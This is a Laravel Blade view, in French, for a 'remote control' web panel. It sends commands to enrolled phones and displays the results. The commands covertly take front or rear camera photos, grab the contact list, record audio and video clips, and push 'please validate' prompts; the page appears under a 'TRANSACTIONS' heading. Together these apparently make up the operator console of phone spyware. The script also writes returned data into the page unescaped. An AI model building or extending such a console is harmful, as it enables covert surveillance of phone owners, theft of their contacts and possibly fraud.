@extends('layouts.main')
@section('title', 'Controle à distance')

@section('body')
    <x-sidebar />
    <x-nav />

    <div class="mdb-page-content page-intro bg-white">
        <div class="container py-3 ">
            <div class="row">
                <div class="col-md-12 mt-5">
                    <div class="row mt-5 mb-2">
                        <div class="col-md-6">
                            <h3 class="font-weight-bold"> TRANSACTIONS (<span nb></span>)</h3>
                        </div>
                        <div class="col-md-6">
                            <div class="row no-gutters">

                                <div class="col">

                                </div>
                                {{-- <div class="col">
                                    <div class="">
                                        @php
                                            $d2 = now();
                                            $d1 = now()->subDays(7);
                                        @endphp
                                        <span>Date</span>
                                        <input name="date" type="text" class="form-control form-control-sm"
                                            id="date" value="{{ "{$d1->format('Y-m-d')} to {$d2->format('Y-m-d')}" }}">
                                    </div>
                                </div> --}}
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-sm-6 my-5">
                            <form action="#" id="f-action">
                                <div class="mb-2">
                                    <span>Tel</span> <br>
                                    <select name="phone_id" class="form-control form-control-sm select2">

                                    </select>
                                </div>
                                <div class="mb-2">
                                    <span>Action</span> <br>
                                    <select name="action" class="form-control form-control-sm select2" style="width: 100%">
                                        <option value="p1.0">Prence une photo Camera avant</option>
                                        <option value="p1.1">Prence une photo Camera avant avec flash</option>
                                        <option value="p0.0">Prence une photo Camera arriere</option>
                                        <option value="p0.1">Prence une photo Camera arriere avec flash</option>
                                        <option value="c">Recuperer la list contact</option>
                                        <option value="a.12">Audio 12 sec</option>
                                        <option value="a.5">Audio 5 sec</option>
                                        <option value="v1.5">Video cam Avant 5 sec</option>
                                        <option value="v0.8">Video cam Arriere 8 sec</option>
                                    </select>
                                </div>
                                <div class="mb-2">
                                    <input name="action2" placeholder="push.1001.veuille valider le">
                                </div>

                                <button class="btn btn-sm btn-danger">
                                    <i class="fa fa-envelope"></i>
                                    Envoyer
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-md-12">
                    <x-error />
                    <div class="table-responsive">
                        <table tdata class="table table-sm table-condensed table-hover table-striped">
                            <thead>
                                <th>ID</th>
                                <th>Action</th>
                                <th>Etat</th>
                                <th>Date</th>
                                <th>Resultat</th>
                            </thead>
                            <tbody></tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <x-footer />
@endsection

@section('js-code')
    @include('files.datatable-js')
    @include('files.flatpickr')
    @include('files.select')

    <script>
        $(function() {
            flatpickr("#date", {
                mode: "range",
                maxDate: "today",
                locale: {
                    firstDayOfWeek: 1
                }
            });
            $('.select2').select2();
            var selsource = $('[name=source]');
            var seluserid = $('[name=users_id]');
            var seldate = $('[name=date]');
            selsource.change(function() {
                datatableOb.ajax.reload(null, false);
            });
            seluserid.change(function() {
                datatableOb.ajax.reload(null, false);
            });
            seldate.change(function() {
                datatableOb.ajax.reload(null, false);
            });
            var showloader = true;

            function getData(interval = true) {
                $.ajax({
                    'url': '{{ route('remotecontol.index') }}',
                    data: {
                        phone_id: $('[name="phone_id"]').val()
                    },
                    success: function(data) {
                        var txt = '';
                        data.actions.forEach(e => {
                            txt += `<tr>
                                <td>${e.id}</td>
                                <td>${e.action}</td>
                                <td>${e.status}</td>
                                <td>${e.date}</td>
                                <td>${e.result??'-'}</td>
                                </tr>`;
                        });
                        $('[tdata]').find('tbody').html(txt);
                        var p = '';
                        data.phones.forEach(e => {
                            p += `<option value="${e.id}">${e.phone} ${e.updatedon}</option>`;
                        });
                        $('[name="phone_id"]').html(p).change();
                    },
                }).always(function() {
                    if (interval) {
                        setTimeout(() => {
                            getData();
                        }, 3000);
                    }
                });
            }

            getData();

            var faction = $('#f-action');

            faction.submit(function() {
                event.preventDefault();
                var form = $(this);
                var btn = $(':submit', form).attr('disabled', true);
                var iclass = btn.find('i').attr('class');
                btn.find('i').removeClass()
                    .addClass('spinner-border spinner-border-sm');
                var data = form.serialize();
                rep = $('#rep', form);
                rep.slideUp();
                $.ajax({
                    url: '{{ route('remotecontol.store') }}',
                    type: 'POST',
                    data: data,
                    timeout: 20000,
                    success: function(res) {
                        if (res.success == true) {
                            rep.html(res.message).removeClass().addClass('alert alert-success')
                                .slideDown();
                            getData(false);
                        } else {
                            var m = res.message + '<br>';
                            m += res.data?.errors_msg?.join('<br>') ?? '';
                            rep.removeClass().addClass('alert alert-danger').html(m)
                                .slideDown();
                        }
                    },
                    error: function(resp) {
                        var mess = resp.responseJSON?.message ??
                            "Une erreur s'est produite, merci de réessayer";
                        rep.removeClass().addClass('alert alert-danger').html(mess).slideDown();
                    }

                }).always(function(s) {
                    btn.attr('disabled', false).find('i').removeClass().addClass(iclass);
                });
            });

        });
    </script>
@endsection
